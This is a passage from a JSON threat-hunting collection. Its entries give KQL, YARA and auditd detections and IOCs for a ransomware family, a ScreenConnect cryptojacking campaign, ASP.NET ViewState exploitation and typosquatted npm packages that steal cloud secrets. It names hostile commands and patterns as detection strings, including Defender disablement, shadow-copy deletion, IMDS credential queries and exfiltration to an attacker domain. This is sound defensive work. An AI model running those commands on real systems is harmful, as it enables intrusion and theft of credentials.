(\"psexec.exe\",\"wmic.exe\",\"sc.exe\",\"schtasks.exe\",\"powershell.exe\",\"pwsh.exe\") | where ProcessCommandLine has_any (@\"\\\\\",\"--password\",\"--spread\",\"--full\",\"share$\",\"process call create\", \"/node:\",\"Invoke-Command\",\"-ComputerName\",\"DefSvc\",\"UpdateSvc\", \"gentlemen_system\") | summarize Mechanisms = dcount(FileName), CmdSamples = make_set(ProcessCommandLine, 10), TargetHosts = make_set(extract(@\"\\\\\\\\([^\\\\\\s]+)\", 1, ProcessCommandLine), 10) by DeviceName, AccountName, bin(Timestamp, 5m) | where Mechanisms >= 3` (Gentlemen fires PsExec + WMIC + sc + schtasks in close succession against the same target — see [[B019]] for the baseline of legitimate admin remote-exec volume so this hunt is not drowned in CM/Ansible noise). **KQL — Defender disablement immediately before file encryption**: `DeviceProcessEvents | where FileName in~ (\"powershell.exe\",\"pwsh.exe\") and ProcessCommandLine has_any (\"Set-MpPreference\",\"DisableRealtimeMonitoring\",\"Add-MpPreference -ExclusionProcess\",\"Add-MpPreference -ExclusionPath \\\"C:\\\\\\\"\") | join kind=inner (DeviceFileEvents | where FileName endswith \".umc16h\" | summarize EncryptStart = min(Timestamp) by DeviceName) on DeviceName | where Timestamp between (EncryptStart - 30m .. EncryptStart)`. **SMB share signal**: `DeviceFileEvents | where ActionType == \"FileCreated\" and FolderPath =~ @\"C:\\Temp\" and FileName =~ \"psexec.exe\"` corroborated by `DeviceRegistryEvents` setting `NullSessionShares` to include `share$` under `\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters`. **YARA fallback** for offline triage (host-image / memory): `rule Gentlemen_Ransom { strings: $s1 = \".umc16h\" $s2 = \"GENTLEMEN\" $s3 = \"9VoAvR7G\" $s4 = \"README-GENTLEMEN.txt\" $s5 = \"gupdates\" nocase $s6 = \"gentlemen_system\" condition: 3 of them }`. Cross-reference **T1543.003** (Create or Modify System Process: Windows Service — `DefSvc`/`UpdateSvc`/`UpdateSvc2` creation), **T1053.005** (Scheduled Task — `gentlemen_system`/`UpdateSystem`/`UpdateUser`), **T1547.001** (Registry Run Keys — `GupdateS`/`GupdateU`), **T1562.001** (Impair Defenses: Disable or Modify Tools — the `Set-MpPreference` pre-encryption sequence — note this is the correct sub-technique for local Defender disablement, NOT T1562.008 which is cloud-log-specific), **T1490** (Inhibit System Recovery — `vssadmin delete shadows /all /quiet`), **T1021.002** (SMB/Windows Admin Shares — the `share$` staging and `\\\\host\\share$` payload pull), and **T1486** (Data Encrypted for Impact — the encryption itself). Pair with [[B019]] for the lateral-movement-orchestration baseline so the multi-mechanism fan-out hunt is operational rather than noisy.",
    "tags": [
      "impact",
      "windows",
      "ransomware",
      "gentlemen",
      "self_propagation",
      "lateral_movement",
      "defense_evasion",
      "encryption",
      "T1486"
    ],
    "techniques": [
      "T1486"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Gentlemen's persistence and lateral fingerprints are unusually distinctive — the `.umc16h` extension, the `GENTLEMEN` footer marker, the `gentlemen_system` task name, the `GupdateS`/`GupdateU` Run values, and the `DefSvc`/`UpdateSvc`/`UpdateSvc2` service names don't collide with any legitimate software or other ransomware family per Microsoft's May 2026 writeup, making any single one of these strings a high-confidence detection on its own\n- The `--password` gate at the front of the encryptor's argv is a unique operational tell — almost no legitimate Windows software requires a hardcoded password argument to launch, and almost no other ransomware family uses this pattern. A `DeviceProcessEvents` rule scoped to \"Go-compiled binary with `--password` and `--spread` flags\" is a single high-precision indicator that survives recompile/repack because the CLI surface is structural\n- The lateral-movement orchestration (21 mechanisms per target — PsExec + WMIC + sc + schtasks + Invoke-Command + Invoke-WmiMethod, all fired in close succession against the same destination host) is a fingerprint of Gentlemen's `--spread` routine rather than a fingerprint of one operator's tradecraft. Detection on \"3+ distinct remote-exec mechanisms from one source to the same destination in 5 minutes\" catches Gentlemen regardless of which credential pair it loaded, and the paired baseline [[B019]] keeps the false-positive rate from admin Ansible/CM runs manageable\n- The Defender-disablement-immediately-before-encryption pattern (`Set-MpPreference -DisableRealtimeMonitoring $true` → `vssadmin delete shadows` → first `.umc16h` write, all on one host within a 30-minute window) is the textbook signal for catching the encryptor before the encryption completes, but only fires usefully on hosts where Defender event logging hasn't been disabled first — which is why pairing it with the persistence fingerprint catches hosts where the operator successfully blinded Defender before the encryption began",
    "references": "- [MITRE ATT&CK T1486 - Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)\n- [MITRE ATT&CK T1543.003 - Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/)\n- [MITRE ATT&CK T1490 - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)\n- [Microsoft Security Blog - The Gentlemen ransomware: Dissecting a self-propagating Go encryptor](https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/)\n- [Sigma Rule - Suspicious Scheduled Task Creation via schtasks.exe](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml)\n- [Red Canary Atomic Red Team - T1486 Data Encrypted for Impact](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md)\n- [Elastic - Hunting for Ransomware Self-Propagation via PsExec/WMI](https://www.elastic.co/security-labs)\n- [CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide)",
    "file_path": "Flames/H170.md"
  },
  {
    "id": "H171",
    "category": "Flames",
    "title": "A Windows host has been compromised by the SEO-poisoning → ScreenConnect → .NET-utility cryptojacking campaign Microsoft documented in May 2026 — identifiable by an `autorun.dll` side-loaded from `~\\Downloads\\` or `%TEMP%\\` followed within 30 minutes by an `msiexec.exe /i /quiet` spawn from the same launcher process, a `ScreenConnect.ClientService.exe` connecting to `directdownload.icu:8041` or `193.42.11.108`, and a `RuntimeHost.exe` binary planted under `%LocalAppData%\\Microsoft\\Windows\\Caches\\D3F4E2A1\\` with three scheduled tasks named `Windows System Health` / `Windows System Health Monitor` / `Windows System Health Check`.",
    "tactic": "Defense Evasion",
    "notes": "Platform: Windows. Microsoft Security Blog \"From poisoned search results to GPU mining: A cryptojacking campaign abusing ScreenConnect and Microsoft .NET utilities\" (May 26, 2026). Initial access via SEO-poisoned downloads impersonating CrystalDiskInfo, HWMonitor, Display Driver Uninstaller, FurMark, K-Lite Codec Pack, PDFgear. The ZIP carries a legitimate signed EXE plus a malicious `autorun.dll` (nine variants observed) that sideloads when the EXE runs, then spawns `msiexec /i /quiet` to silently install `vcredist_x64.dll`, then deploys ScreenConnect ClientService for persistence/C2, then `SimpleRunPE.exe` hollows the miner into one of: `InstallUtil.exe`, `RegAsm.exe`, `RegSvcs.exe`, `MSBuild.exe`, `AppLaunch.exe`, `AddInProcess.exe`, `aspnet_compiler.exe`. Over 150 attacker-controlled domains; current campaign IP `193.42.11[.]108`. **Detection sources**: Defender for Endpoint `DeviceProcessEvents`, `DeviceImageLoadEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`, `DeviceRegistryEvents`; Windows Security Event ID **4688** (process create); Sysmon Event IDs **1** (process create — for `RuntimeHost.exe` and the .NET utilities), **7** (image load — for `autorun.dll` sideload), **11** (file create — for `RuntimeHost.exe` in `Caches\\D3F4E2A1\\`), **13** (registry set — for `WinSysCache` Run value). **KQL — autorun.dll sideload → msiexec chain (Microsoft published this verbatim)**: `let SideloadingProcesses = DeviceImageLoadEvents | where Timestamp > ago(60d) | where FileName =~ \"autorun.dll\" | where InitiatingProcessFolderPath has_any (@\"\\Downloads\\\",@\"\\AppData\\Local\\Temp\\\",@\"\\AppData\\Roaming\\\",@\"\\ProgramData\\\",@\"\\Users\\Public\\\",@\"\\Desktop\\\") | where FolderPath has @\"\\sources\\\" | project SideloadTime = Timestamp, DeviceId, DeviceName, LauncherProcessId = InitiatingProcessId, LauncherCreationTime = InitiatingProcessCreationTime, LauncherName = InitiatingProcessFileName, LauncherPath = InitiatingProcessFolderPath, SideloadedDllPath = FolderPath; let unique_devices = SideloadingProcesses | distinct DeviceId; let MsiSpawns = DeviceProcessEvents | where Timestamp > ago(60d) | where DeviceId in (unique_devices) | where FileName =~ \"msiexec.exe\" | where ProcessCommandLine has \"/i\" | where ProcessCommandLine has \"/quiet\" | project MsiSpawnTime = Timestamp, DeviceId, LauncherProcessId = InitiatingProcessId, LauncherCreationTime = InitiatingProcessCreationTime, MsiCmd = ProcessCommandLine, MsiProcessId = ProcessId; SideloadingProcesses | join kind=inner MsiSpawns on DeviceId, LauncherProcessId, LauncherCreationTime | where MsiSpawnTime between (SideloadTime .. (SideloadTime + 30m))`. **KQL — RuntimeHost in the campaign-specific cache folder (Microsoft verbatim)**: `DeviceProcessEvents | where Timestamp > ago(30d) | where FileName =~ \"RuntimeHost.exe\" or InitiatingProcessFileName =~ \"RuntimeHost.exe\" | where FolderPath has @\"\\Caches\\D3F4E2A1\" or InitiatingProcessFolderPath has @\"\\Caches\\D3F4E2A1\"`. **KQL — campaign scheduled tasks (Microsoft verbatim)**: `DeviceProcessEvents | where Timestamp > ago(30d) | where FileName =~ \"schtasks.exe\" | where ProcessCommandLine has \"/create\" | where ProcessCommandLine has_any (\"Windows System Health Monitor\",\"Windows System Health\")`. **Additional hunt — .NET utility hollowing (campaign target list)**: `DeviceProcessEvents | where FileName in~ (\"InstallUtil.exe\", \"RegAsm.exe\",\"RegSvcs.exe\",\"MSBuild.exe\",\"AppLaunch.exe\", \"AddInProcess.exe\",\"aspnet_compiler.exe\") | join kind=inner (DeviceNetworkEvents | where RemoteIPType == \"Public\" and RemoteIP != \"\" | summarize Conns = count(), Bytes = sum(toint( coalesce(InitiatingProcessFolderPath,\"0\"))) by DeviceName, InitiatingProcessId, RemoteIP) on $left.DeviceName == $right.DeviceName and $left.ProcessId == $right.InitiatingProcessId | where Conns > 100` — these utilities almost never make sustained network connections legitimately. **Network IOC**: ScreenConnect to `directdownload.icu`, port 8041, current IP `193.42.11[.]108`. **Persistence fingerprints**: registry `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSysCache` and `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSysCache`, startup shortcut `%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RuntimeHost.lnk`. Cross-reference **T1218.004** (InstallUtil), **T1218.009** (Regsvcs/Regasm), **T1127.001** (Trusted Developer Utilities: MSBuild) — the .NET utilities the miner hollows into; **T1036.005** (Match Legitimate Name or Location — the campaign-impersonated software names); **T1496** (Resource Hijacking — the miner payload itself); **T1219** (Remote Access Software — the ScreenConnect client used for operator-grade persistence, not just C2); and **T1053.005** (Scheduled Task — the three `Windows System Health*` tasks).",
    "tags": [
      "defense_evasion",
      "windows",
      "dll_sideloading",
      "screenconnect",
      "cryptojacking",
      "seo_poisoning",
      "runtime_host",
      "net_utility_hollowing",
      "T1574.002"
    ],
    "techniques": [
      "T1574.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Microsoft published high-confidence detection KQL verbatim for three signal points (autorun.dll → msiexec join, RuntimeHost in `\\Caches\\D3F4E2A1\\`, \"Windows System Health*\" task creation), and any one of the three is rare enough that a hit is investigatable — the join across the three turns it into a near-zero-false-positive multi-signal detection on the same host\n- The `autorun.dll` sideload from `~\\Downloads\\` plus an `msiexec /i /quiet` spawn from the same launcher PID within 30 minutes is a behavioral pattern that survives the nine-variant rotation Microsoft observed — the campaign can rotate DLL contents and hash, but the launcher-PID linkage and the `/quiet` MSI cover step is structural and required for the stealth-install to work\n- The `\\Caches\\D3F4E2A1\\` folder is the most distinctive path-based IOC in the campaign — `D3F4E2A1` is a fixed pseudo-GUID the operator chose, and no legitimate Microsoft product creates that exact subfolder under `%LocalAppData%\\Microsoft\\Windows\\Caches\\`, so a `DeviceFileEvents` rule on that literal path string is essentially a free, high-precision tripwire\n- Hollowing the miner into `InstallUtil.exe`/`MSBuild.exe`/`RegAsm.exe`/`RegSvcs.exe`/`AppLaunch.exe`/`AddInProcess.exe`/`aspnet_compiler.exe` is the textbook .NET-utility LOLBin pattern, and these binaries virtually never make sustained outbound connections legitimately — so the join of \"any of these 7 binaries + sustained outbound connections\" is operational without requiring the campaign-specific path/IOC, and catches re-skins of the same operator running future campaigns",
    "references": "- [MITRE ATT&CK T1574.002 - Hijack Execution Flow: DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)\n- [MITRE ATT&CK T1218.004 - System Binary Proxy Execution: InstallUtil](https://attack.mitre.org/techniques/T1218/004/)\n- [MITRE ATT&CK T1496 - Resource Hijacking](https://attack.mitre.org/techniques/T1496/)\n- [Microsoft Security Blog - From poisoned search results to GPU mining: A cryptojacking campaign abusing ScreenConnect and Microsoft .NET utilities](https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/)\n- [Sigma Rule - InstallUtil Execution Spawned by Non-Standard Parent](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_installutil_spawn.yml)\n- [Red Canary Atomic Red Team - T1218.004 InstallUtil](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md)\n- [LOLBAS Project - InstallUtil.exe](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)\n- [Elastic - Detecting MSBuild / InstallUtil execution from non-developer parents](https://www.elastic.co/security-labs)",
    "file_path": "Flames/H171.md"
  },
  {
    "id": "H172",
    "category": "Flames",
    "title": "An IIS-hosted ASP.NET application (KnowledgeDeliver LMS or any ASP.NET app sharing hardcoded `machineKey` values across customer deployments) is being exploited via ViewState deserialization — an inbound HTTP POST containing a `__VIEWSTATE` payload triggers ASP.NET Event ID 1316 (Event code 4009) on the IIS server, immediately followed by `w3wp.exe` spawning `cmd.exe`/`whoami.exe`/`powershell.exe`/ `icacls.exe` and BLUEBEAM (Godzilla-family) in-memory web shell activity that subsequently tampers application `.js` files to inject a remote-script-loader for client-side Cobalt Strike BEACON delivery.",
    "tactic": "Persistence",
    "notes": "Platform: Windows / IIS. Mandiant (Google Cloud Threat Intelligence) \"Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability\" (May 25, 2026) — CVE-2026-5426. Root cause: identical pre-shared `machineKey` values in `web.config` across all KnowledgeDeliver LMS customer deployments, enabling any attacker who knows the key to craft a valid `__VIEWSTATE` payload that ASP.NET deserializes into arbitrary .NET object execution inside `w3wp.exe`. Post-exploit: BLUEBEAM (`LoadLibrary.dll`, SHA-256 `7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2`) loaded entirely in-memory inside `w3wp.exe`; `icacls` grants Everyone:F on web-app root; application `.js` files modified to display a fake \"security authentication plugin\" prompt and silently load a remote script that delivers Cobalt Strike BEACON to user workstations (the payload is encrypted with the org name as the key — a targeted social-engineering twist). **Detection sources**: Windows Application Event Log (ASP.NET 4.0.30319.0 source) for Event ID **1316** — message must contain `Event code: 4009`; Windows Security Event ID **4688** for `w3wp.exe`-spawned child processes; IIS access log fields `cs-uri-stem`, `cs-uri-query`, `cs-method`, `cs(User-Agent)`, `cs-bytes`, `sc-status`; Sysmon Event ID **1** (process create) and Event ID **11** (file create on web root). **KQL — Event 1316 + w3wp child process in the same hour**: `let viewstate_failures = Event | where EventLog == \"Application\" and Source == \"ASP.NET 4.0.30319.0\" and EventID == 1316 and RenderedDescription has \"Event code: 4009\" | project FailureTime = TimeGenerated, Computer; let w3wp_children = DeviceProcessEvents | where InitiatingProcessFileName =~ \"w3wp.exe\" and FileName in~ (\"cmd.exe\",\"whoami.exe\",\"powershell.exe\", \"pwsh.exe\",\"icacls.exe\",\"net.exe\",\"tasklist.exe\",\"systeminfo.exe\", \"ipconfig.exe\",\"nltest.exe\",\"quser.exe\",\"reg.exe\") | project ChildTime = Timestamp, DeviceName, ChildFile = FileName, ChildCmd = ProcessCommandLine, w3wpFolderPath = InitiatingProcessFolderPath; viewstate_failures | join kind=inner w3wp_children on $left.Computer == $right.DeviceName | where ChildTime between (FailureTime .. (FailureTime + 1h))`. **KQL — web root file tampering after w3wp recon**: `DeviceFileEvents | where InitiatingProcessFileName =~ \"w3wp.exe\" and ActionType == \"FileModified\" and FileName endswith \".js\" or FileName endswith \".aspx\" | project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine`. **KQL — icacls grant Everyone on web root**: `DeviceProcessEvents | where FileName =~ \"icacls.exe\" and ProcessCommandLine has \"Everyone\" and ProcessCommandLine has_any (\":F\",\":(OI)(CI)F\",\"/grant\") and ProcessCommandLine has_any (\"inetpub\",\"wwwroot\",\"KnowledgeDeliver\",\"\\\\Web\")`. **IIS-log signal — concatenated User-Agent strings (Mandiant noted this pattern across ViewState exploit families including prior Sitecore campaigns)**: hunt `cs(User-Agent)` for the presence of two distinct browser UA strings concatenated, e.g. `Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...` — regex `Mozilla/5\\.0.*Mozilla/5\\.0` against the UA field catches the pattern. **Mandiant SecOps rule pack** (use these names as pivots): `ASP.NET ViewState Deserialization Attempt`, `W3wp Launching Cmd With Recon Commands`, `W3wp Launching Encoded Powershell`, `W3wp Launching Icacls`, `Web Server Process Launching Whoami`, `IIS ViewState Exploitation Success`, `IIS ViewState Exploitation Followed by Web Root File Tampering`. **Pre-incident posture check (run this even with no current signals)**: search every IIS host's `web.config` files for a `<machineKey>` element with hardcoded `validationKey`/`decryptionKey` values, rotate them per IIS deployment, and audit any other vendor LMS / collab / portal product for the same shared-key failure mode. Cross-reference **T1190** (Exploit Public-Facing Application — the ViewState RCE itself), **T1059.001** (PowerShell — the encoded child processes), **T1222.001** (Windows File and Directory Permissions Modification — the `icacls Everyone:F`), **T1027.011** (Fileless Storage — BLUEBEAM's in-memory residence), and **T1189** (Drive-by Compromise — the client-side BEACON delivery via tampered `.js`).",
    "tags": [
      "persistence",
      "windows",
      "iis",
      "web_shell",
      "viewstate",
      "deserialization",
      "bluebeam",
      "godzilla",
      "aspnet",
      "T1505.003"
    ],
    "techniques": [
      "T1505.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- ASP.NET Event ID 1316 with `Event code: 4009` is a purpose-built signal that ASP.NET emits when a `__VIEWSTATE` deserialization integrity check fails (or succeeds-but-deserialization-fails) — Mandiant calls this out as the single most reliable \"someone is trying to exploit ViewState here right now\" tripwire, and it lives in a log most defenders already collect (`Event` table from the Application log) without any new instrumentation\n- The `w3wp.exe → cmd/whoami/powershell/icacls` lineage is the textbook web-shell-active signal across every IIS-hosted post-exploit (Mandiant''s rule set is built around exactly this), and the join against Event 1316 in the same 60-minute window upgrades both signals from individually-noisy to jointly-high-confidence — Event 1316 fires often on broken legitimate deployments, w3wp children fire on legitimate vendor admin tooling, but the two together inside an hour are essentially always exploitation\n- The hardcoded-`machineKey` failure mode generalizes: KnowledgeDeliver is the May 2026 instance, but Sitecore (2025), Telerik UI (multiple years), several ASP.NET CMS products, and the broader category of vendor SaaS-on-IIS appliances all ship with shared or hardcoded keys and stay vulnerable indefinitely after the CVE. The same Event 1316 + w3wp-child join works for all of them, so the hunt is reusable as future shared-key disclosures emerge\n- The `.js`/`.aspx` file modification by `w3wp.exe` is the post-exploit pivot that turns server compromise into client-side compromise — every user of the LMS becomes a Cobalt Strike BEACON delivery target. Detecting the web-root-tampering step is the cheapest place to stop the second-stage spread to the broader user base, and `DeviceFileEvents` with `InitiatingProcessFileName =~ \"w3wp.exe\"` filtering on `.js`/`.aspx` modifications is essentially never legitimate outside of vendor deploy pipelines",
    "references": "- [MITRE ATT&CK T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)\n- [MITRE ATT&CK T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)\n- [Google Cloud Threat Intelligence (Mandiant) - Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability](https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability/)\n- [Microsoft Learn - ASP.NET ViewState integrity errors (Event ID 1316)](https://learn.microsoft.com/en-us/aspnet/whitepapers/aspnet4/breaking-changes#viewstate)\n- [Mandiant - Sitecore ViewState Exploitation Patterns](https://cloud.google.com/blog/topics/threat-intelligence/sitecore-viewstate-exploitation/)\n- [Sigma Rule - W3wp Spawning Suspicious Child Processes](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_iis_w3wp_susp_child.yml)\n- [Red Canary Atomic Red Team - T1505.003 Web Shell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1505.003/T1505.003.md)\n- [NCC Group - Detecting Godzilla / BLUEBEAM .NET In-Memory Web Shells](https://www.nccgroup.com/research/)",
    "file_path": "Flames/H172.md"
  },
  {
    "id": "H173",
    "category": "Flames",
    "title": "An npm install on a developer workstation or CI/CD runner is executing a typosquatted package's `preinstall`/`postinstall` lifecycle hook that immediately queries the AWS Instance Metadata Service (`169.254.169.254` / `169.254.170.2`), reads cloud credential files (`~/.aws/credentials`, `~/.npmrc`, HashiCorp Vault env vars), spawns a detached process with `__DAEMONIZED=1` in the environment, drops `payload.bin` inside `node_modules/`, or downloads a Bun runtime from `github.com/oven-sh/bun/releases/download` — exfiltrating collected secrets to attacker infrastructure (initially `aab.sportsontheweb[.]net/x.php` with header `X-Supply 1`).",
    "tactic": "Credential Access",
    "notes": "Platform: Windows / Linux / macOS (any host running `npm install` with Defender for Endpoint or an EDR that emits `DeviceProcessEvents` / `DeviceNetworkEvents` / `DeviceFileEvents`). Microsoft Security Blog \"Typosquatted npm packages used to steal cloud and CI/CD secrets\" (May 28, 2026) documented the vpmdhaj campaign — Gen-1 staged via HTTP POST to `aab.sportsontheweb.net/x.php`, Gen-2 ships the payload pre-bundled inside the tarball and uses the Bun runtime downloaded at install time to evade Node-runtime instrumentation. Targets: AWS EC2/ECS IMDS, AWS Secrets Manager (enumeration across 16+ regions with bundled SigV4 signer), HashiCorp Vault tokens (`VAULT_TOKEN`, `VAULT_AUTH_TOKEN` env vars), npm publish tokens (`/-/whoami`, `/-/npm/v1/tokens`), GitHub Actions context (`GITHUB_REPOSITORY`, `RUNNER_OS`), CI/CD pipeline secrets. Microsoft IOCs: preinstall.js SHA-256 `638788AFC4F1B5860A328312CAF5895ABD5F5632D28A4F2A85B09076E270D15D`, setup.mjs SHA-256 `77D92EFE7AF3547F71FD41D4A884872D66B1BE9499EAA637E91EAC866911694D`. **Detection sources**: Defender for Endpoint `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceFileEvents` (all three are available for the MDE Linux and MDE macOS agents — this hunt works cross-platform without modification); Linux `auditd` for IMDS `connect()` syscalls; macOS Endpoint Security Framework `ES_EVENT_TYPE_NOTIFY_EXEC` for npm/node spawns; CI/CD platform audit logs (GitHub Actions workflow runs, GitLab job artifacts). **KQL — npm lifecycle script execution (Microsoft verbatim)**: `DeviceProcessEvents | where Timestamp > ago(7d) | where FileName in~ (\"node.exe\",\"node\",\"npm.cmd\",\"npm.exe\",\"npx.cmd\",\"npx.exe\") | where ProcessCommandLine has_any (\"preinstall\",\"postinstall\",\"install\")`. **KQL — detached daemon environment marker (Microsoft verbatim)**: `DeviceProcessEvents | where Timestamp > ago(7d) | where ProcessCommandLine has \"__DAEMONIZED=1\" or InitiatingProcessCommandLine has \"__DAEMONIZED=1\"`. **KQL — stage-2 payload artifact (Microsoft verbatim)**: `DeviceFileEvents | where Timestamp > ago(7d) | where FileName =~ \"payload.bin\" | where FolderPath has \"node_modules\"`. **KQL — Bun runtime download from GitHub (Microsoft verbatim)**: `DeviceNetworkEvents | where Timestamp > ago(7d) | where InitiatingProcessFileName in~ (\"node.exe\",\"node\") | where RemoteUrl has \"github.com/oven-sh/bun/releases/download\"`. **KQL — IMDS queries from node/bun (Microsoft verbatim)**: `DeviceNetworkEvents | where Timestamp > ago(7d) | where InitiatingProcessFileName in~ (\"node.exe\",\"node\",\"bun.exe\",\"bun\") | where RemoteIP in (\"169.254.169.254\",\"169.254.170.2\")`. **High-signal join — npm install + IMDS within 5 minutes on the same device**: `DeviceProcessEvents | where FileName in~ (\"npm.exe\",\"npm.cmd\",\"npm\",\"npx.exe\",\"npx.cmd\",\"npx\") and ProcessCommandLine has \"install\" | join kind=inner (DeviceNetworkEvents | where RemoteIP in (\"169.254.169.254\",\"169.254.170.2\") and InitiatingProcessFileName in~ (\"node.exe\",\"node\",\"bun.exe\",\"bun\")) on DeviceName | where Timestamp1 between (Timestamp .. Timestamp + 5m)` — IMDS from node/bun is essentially never a legitimate application behavior outside of cloud-SDK code paths, and an npm install triggering IMDS in the same window is the textbook preinstall-secret-theft fingerprint. **Linux/macOS variant — auditd or ESF on IMDS connect**: Linux `auditd -a always,exit -F arch=b64 -S connect -F a2=0x2 -F path=/usr/bin/node -k node_imds_connect`; macOS ESF subscribe to `ES_EVENT_TYPE_NOTIFY_EXEC` filtered to `node`/`npm`/`bun` spawning processes that subsequently connect to `169.254.169.254`. **GitHub Actions / CI corroboration**: hunt workflow runs that invoke `npm install`/`npm ci` on a runner where the same job also calls out to a non-GitHub/non-registry destination during the install phase — the GitHub Actions audit log captures workflow start/end but the runner-side syscall trace requires Defender for Endpoint on the runner or an equivalent EDR (Falco/osquery on self-hosted Linux runners). **Network IOCs**: exfil to `aab.sportsontheweb[.]net` (port 80, header `X-Supply: 1`); Bun pull from `github.com/oven-sh/bun/releases/download` from a Node parent (legitimate Bun installs from Node are vanishingly rare). Cross-reference **T1195.002** (Compromise Software Supply Chain — the npm typosquat itself), **T1059.007** (Command and Scripting Interpreter: JavaScript), **T1552.001** (Credentials In Files — `~/.npmrc`, `~/.aws/credentials`), **T1041** (Exfiltration Over C2 Channel — the `aab.sportsontheweb.net` POST), and **T1078.004** (Valid Accounts: Cloud Accounts — the downstream AWS/Vault session resumption with stolen tokens).",
    "tags": [
      "credential_access",
      "supply_chain",
      "npm",
      "ci_cd",
      "aws_imds",
      "cloud_credentials",
      "bun_runtime",
      "typosquatting",
      "T1552.005"
    ],
    "techniques": [
      "T1552.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The \"npm install + IMDS access from node/bun within 5 minutes on the same host\" join is essentially a free, high-precision detection — cloud SDKs that legitimately query IMDS do so from long-running app processes (web servers, batch workers), not from a transient npm-spawned node invocation during package install. Combining the npm-process pattern with the IMDS-destination pattern across `DeviceProcessEvents` and `DeviceNetworkEvents` is a single join that cleanly separates malicious preinstall-hook secret theft from legitimate cloud-SDK runtime behavior\n- The `__DAEMONIZED=1` environment marker is a campaign-specific tell that the operator chose for their detached-payload spawn — it survives obfuscation of the JavaScript payload itself (the env var is plaintext in the process command-line argv), making it a high-confidence single-signal IOC even as the campaign rotates package names, tarball hashes, and stager filenames\n- Pulling the Bun runtime from `github.com/oven-sh/bun/releases/download` *from a node parent process* is the Gen-2 evasion technique Microsoft documented — Bun is a legitimate JavaScript runtime, but Node spawning a Bun download mid-install is anomalous because no legitimate package ecosystem chains the two runtimes that way. The signal generalizes to future \"alternate-runtime evasion\" campaigns where the attacker pulls Deno, Bun, or QuickJS to escape Node-runtime instrumentation\n- The hunt is one of the cheapest possible coverage points for the entire CI/CD supply-chain attack surface — `npm install` runs on developer workstations and GitHub Actions runners daily across most engineering orgs, and Microsoft's published KQL works against `DeviceProcessEvents` / `DeviceNetworkEvents` / `DeviceFileEvents` which the MDE Linux and MDE macOS agents emit identically to Windows — so a single rule deployment covers the full developer + CI surface without per-platform query rewrites",
    "references": "- [MITRE ATT&CK T1552.005 - Unsecured Credentials: Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)\n- [MITRE ATT&CK T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain](https://attack.mitre.org/techniques/T1195/002/)\n- [Microsoft Security Blog - Typosquatted npm packages used to steal cloud and CI/CD secrets](https://www.microsoft.com/en-us/security/blog/2026/05/28/typosquatted-npm-packages-used-steal-cloud-ci-cd-secrets/)\n- [Microsoft Security Blog - Malicious npm packages abuse dependency confusion to profile developer environments](https://www.microsoft.com/en-us/security/blog/2026/05/29/33-malicious-npm-packages-abuse-dependency-confusion-profile-developer-environments/)\n- [AWS - Use IMDSv2 to defend against credential theft via SSRF and supply chain attacks](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)\n- [Sigma Rule - Suspicious npm/yarn/pnpm install hooks reaching cloud metadata](https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation)\n- [GitHub Actions - Security hardening for runners](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)\n- [Red Canary Atomic Red Team - T1552.005 Cloud Instance Metadata API](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.005/T1552.005.md)",
    "file_path": "Flames/H173.md"
  },
  {
    "id": "H174",
    "category": "Flames",
